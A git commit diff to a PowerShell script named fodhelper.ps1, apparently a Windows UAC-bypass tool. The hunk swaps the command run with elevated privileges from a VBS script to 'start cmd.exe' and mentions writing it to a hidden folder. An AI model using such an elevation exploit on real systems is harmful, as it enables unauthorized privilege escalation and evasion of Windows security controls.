3e5ce13740740c32f9715a321347cfa4fd042776
ShorterKing <84120105+ShorterKing@users.noreply.github.com>
2025-03-28 20:07:11 +0530

    Update fodhelper.ps1

--- fodhelper.ps1
+++ fodhelper.ps1
@@ -47,7 +47,7 @@ try {
 # Define the commands to execute with elevated privileges
 $CommandsToExecute = @"
 # Define your commands here
- wscript 'C:\Windows\script.vbs'
+ start cmd.exe
 "@
 
 # Write the commands to a script file in the hidden folder
